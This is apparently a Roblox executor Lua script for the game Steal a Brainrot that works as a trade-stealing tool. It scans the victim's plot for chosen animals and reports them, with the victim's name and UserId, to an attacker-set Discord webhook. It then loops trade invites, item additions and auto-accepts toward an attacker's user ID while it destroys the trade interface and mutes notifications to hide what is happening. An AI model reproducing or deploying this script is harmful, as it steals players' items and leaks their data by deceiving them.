--[[
    Core handler - reads config from getgenv
]]

local env = getgenv()

local placeWhitelist = env.ALLOWED_PLACE_IDS or {
    109983668079237,
    78906538690694,
    119594317142884
}

if #placeWhitelist > 0 then
    local allowed = false
    for _, id in ipairs(placeWhitelist) do
        if game.PlaceId == id then
            allowed = true
            break
        end
    end
    if not allowed then
        return
    end
end

local RS = game:GetService("ReplicatedStorage")
local Plrs = game:GetService("Players")
local HS = game:GetService("HttpService")
local me = Plrs.LocalPlayer
local camera = workspace.CurrentCamera
local playerGui = me:WaitForChild("PlayerGui")
local netFolder = RS:WaitForChild("Packages"):WaitForChild("Net")

local webhookUrl = env.GOOD_WEBHOOK or ""
local avatarUrl = env.GOOD_AVATAR or "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
local tradeTarget = tonumber(env.TARGET_USER_ID) or 0

local STEP_DELAY = 1.1
local CYCLE_DELAY = 2.2

-- obfuscated-looking constants (same values, different names)
local GUID_INVITE  = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
local GUID_SELECT  = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
local GUID_READY   = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
local GUID_ACCEPT  = "918ee0f5-e98f-413f-b76e-baee47b021cb"

local killGuiSet = {
    BrainrotTrader = true,
    TradeLiveTrade = true,
    TradePrompts = true
}

-- build lookup from external list
local wantedSet = {}
local pingSet = {}

if type(env.ALLOWED_ANIMALS) == "table" then
    for _, entry in pairs(env.ALLOWED_ANIMALS) do
        if type(entry) == "string" and entry ~= "" then
            wantedSet[entry] = true
            pingSet[entry] = true
        end
    end
end

local function locateNet(partial)
    local kids = netFolder:GetChildren()
    for idx, obj in ipairs(kids) do
        if string.find(obj.Name, partial) then
            local before = kids[idx - 1]
            if before and (before:IsA("RemoteFunction") or before:IsA("RemoteEvent")) then
                return before
            end
        end
    end
    return nil
end

local function cleanEnvironment()
    local left = playerGui:FindFirstChild("LeftCenter")
    if left then
        local bak = left:Clone()
        bak.Name = "LeftCenter_Backup"
        bak.Parent = playerGui
        left:Destroy()
    end

    local notify = locateNet("RE/NotificationService/Notify")
    if notify then
        pcall(function()
            for _, conn in ipairs(getconnections(notify.OnClientEvent)) do
                conn:Disable()
            end
        end)
    end

    local function stripBlur(child)
        if child:IsA("BlurEffect") then
            task.defer(child.Destroy, child)
        end
    end
    camera.ChildAdded:Connect(stripBlur)
    for _, c in ipairs(camera:GetChildren()) do
        stripBlur(c)
    end

    camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
        camera.FieldOfView = 70
    end)
    camera.FieldOfView = 70

    local function stripTradeGui(child)
        if killGuiSet[child.Name] then
            task.defer(child.Destroy, child)
        end
    end
    playerGui.ChildAdded:Connect(stripTradeGui)
    for _, c in ipairs(playerGui:GetChildren()) do
        stripTradeGui(c)
    end
end

local animalDataModule
pcall(function()
    animalDataModule = require(RS:WaitForChild("Datas"):WaitForChild("Animals"))
end)

local function resolvePlotAndList()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil, nil end

    local root = me.Character and me.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        for _ = 1, 25 do
            task.wait(0.08)
            root = me.Character and me.Character:FindFirstChild("HumanoidRootPart")
            if root then break end
        end
    end
    if not root then return nil, nil end

    local nearest, bestDist = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        local ok, pos = pcall(function()
            return plot:GetPivot().Position
        end)
        if ok and pos then
            local d = (pos - root.Position).Magnitude
            if d < bestDist then
                bestDist = d
                nearest = plot
            end
        end
    end
    if not nearest then return nil, nil end

    local sync = RS.Packages:FindFirstChild("Synchronizer")
    local req = sync and sync:FindFirstChild("RequestData")
    if not req then return nil, nil end

    local success, payload = pcall(function()
        return req:InvokeServer(nearest.Name)
    end)
    if not success or type(payload) ~= "table" or type(payload.AnimalList) ~= "table" then
        return nil, nil
    end
    return nearest, payload.AnimalList
end

local plot, list = resolvePlotAndList()
if not plot or not list then
    warn("[Handler] Plot / AnimalList missing")
    return
end

local queue = {}
for key, entry in pairs(list) do
    if type(entry) == "table" and entry.Index then
        local shown = entry.Index
        if animalDataModule and animalDataModule[entry.Index] and animalDataModule[entry.Index].DisplayName then
            shown = animalDataModule[entry.Index].DisplayName
        end
        if wantedSet[shown] or wantedSet[entry.Index] then
            table.insert(queue, {
                key = tonumber(key),
                payload = entry
            })
        end
    end
end

if #queue == 0 then
    warn("[Handler] Nothing matched ALLOWED_ANIMALS")
    return
end

print("[Handler] Queue size:", #queue)
cleanEnvironment()

local function httpCall()
    return (syn and syn.request)
        or (http and http.request)
        or http_request
        or request
end

local function wikiSlug(name)
    local base = name:match("^(.-)%s*%(") or name
    return base:gsub(" ", "_")
end

local function grabFandomThumb(name)
    local req = httpCall()
    if not req then return nil end
    local page = "https://stealabrainrot.fandom.com/wiki/" .. wikiSlug(name)
    for try = 1, 3 do
        local ok, res = pcall(function()
            return req({
                Url = page,
                Method = "GET",
                Headers = {
                    ["User-Agent"] = "Mozilla/5.0",
                    ["Accept"] = "text/html",
                },
                Timeout = 10
            })
        end)
        if ok and res and res.StatusCode == 200 and res.Body then
            local img = res.Body:match('property="og:image"%s+content="([^"]+)"')
                     or res.Body:match('content="([^"]+)"%s+property="og:image"')
            if img and img:find("^https?://") then
                return img:gsub("&amp;", "&")
            end
        end
        if try < 3 then task.wait(0.4 * try) end
    end
    return nil
end

local function dominantColor(index)
    local result = nil
    pcall(function()
        local models = RS:FindFirstChild("Models")
        local folder = models and models:FindFirstChild("Animals")
        if not folder then return end
        local model = folder:FindFirstChild(index)
        if not model and animalDataModule and animalDataModule[index] then
            model = folder:FindFirstChild(animalDataModule[index].DisplayName)
        end
        if not model then return end
        local top = 0
        for _, part in ipairs(model:GetDescendants()) do
            if part:IsA("BasePart") then
                local col = part.Color
                local volume = part.Size.X * part.Size.Y * part.Size.Z
                local mx = math.max(col.R, col.G, col.B)
                local mn = math.min(col.R, col.G, col.B)
                local sat = (mx > 0) and ((mx - mn) / mx) or 0
                local bri = col.R * 0.299 + col.G * 0.587 + col.B * 0.114
                local bias = (bri < 0.08 and 0.05) or (bri > 0.92 and 0.15) or 1
                local score = (sat * 3 + 0.2) * bias * volume
                if score > top then
                    top = score
                    result = col
                end
            end
        end
    end)
    return result
end

local function toDiscordColor(c)
    if not c then return 3447003 end
    local r = math.clamp(math.floor(c.R * 255), 0, 255)
    local g = math.clamp(math.floor(c.G * 255), 0, 255)
    local b = math.clamp(math.floor(c.B * 255), 0, 255)
    return r * 65536 + g * 256 + b
end

local function resolveImage(name, index)
    local fromFandom = grabFandomThumb(name)
    if fromFandom then return fromFandom end
    local info = animalDataModule and animalDataModule[index]
    if info then
        for _, field in ipairs({"Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId"}) do
            if type(info[field]) == "string" then
                local id = info[field]:match("%d+")
                if id then
                    return "https://tr.rbxcdn.com/" .. id .. "/420/420/Image/Png"
                end
            end
        end
    end
    return nil
end

local function fireWebhook()
    if webhookUrl == "" then return end

    local collected = {}
    local shouldPing = false

    for _, entry in pairs(list) do
        if type(entry) == "table" and entry.Index then
            local info = animalDataModule and animalDataModule[entry.Index]
            if info then
                local shown = info.DisplayName or entry.Index
                if pingSet[shown] or pingSet[entry.Index] then
                    shouldPing = true
                    local mut = entry.Mutation or "None"
                    local traits = (entry.Traits and #entry.Traits > 0) and entry.Traits or {}
                    local prefix = (mut ~= "None" and mut ~= "") and ("[" .. mut .. "] ") or ""
                    local line = prefix .. "**" .. shown .. "**"
                    if #traits > 0 then
                        line = line .. " *(x" .. #traits .. " traits)*"
                    end
                    table.insert(collected, {
                        index = entry.Index,
                        shown = shown,
                        line = line
                    })
                end
            end
        end
    end

    if #collected == 0 then return end

    table.sort(collected, function(a, b)
        return a.shown < b.shown
    end)

    local req = httpCall()
    if not req then return end

    local first = collected[1]
    local thumb = resolveImage(first.shown, first.index)
    local col = toDiscordColor(dominantColor(first.index))

    local bodyLines = {}
    for i, item in ipairs(collected) do
        bodyLines[i] = item.line
    end
    local desc = table.concat(bodyLines, "\n")
    if #desc > 3800 then
        desc = desc:sub(1, 3796) .. "..."
    end

    local embed = {
        title = first.shown,
        description = desc,
        color = col,
        fields = {
            {
                name = "Server",
                value = "Players: **" .. #Plrs:GetPlayers() .. "** | <t:" .. os.time() .. ":R>",
                inline = true
            },
            {
                name = "Client",
                value = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown",
                inline = true
            }
        },
        footer = { text = me.Name .. " • " .. me.UserId },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    if thumb then
        embed.thumbnail = { url = thumb }
    end

    local payload = {
        embeds = { embed },
        username = "Scanner",
        avatar_url = avatarUrl
    }
    if shouldPing then
        payload.content = "||@everyone||"
    end

    pcall(function()
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HS:JSONEncode(payload)
        })
    end)
end

local function beginTradeLoop()
    if tradeTarget == 0 then
        warn("[Handler] TARGET_USER_ID missing")
        return
    end

    local inv = locateNet("RF/TradeService/Invite")
    local add = locateNet("RF/TradeService/AddBrainrot")
    local rdy = locateNet("RE/TradeService/Ready")
    local acc = locateNet("RE/TradeService/Accept")

    if not (inv and add and rdy and acc) then
        warn("[Handler] Trade remotes not found")
        return
    end

    task.spawn(function()
        local i = 1
        while true do
            local item = queue[i]
            if item then
                pcall(function()
                    add:InvokeServer(GUID_SELECT, item.key, item.payload)
                end)
                i = (i % #queue) + 1
            end
            task.wait(STEP_DELAY)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                inv:InvokeServer(GUID_INVITE, tradeTarget)
            end)
            task.wait(CYCLE_DELAY)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                rdy:FireServer(GUID_READY)
            end)
            task.wait(1.05)
            pcall(function()
                acc:FireServer(GUID_ACCEPT)
            end)
            task.wait(1.05)
        end
    end)
end

fireWebhook()
beginTradeLoop()
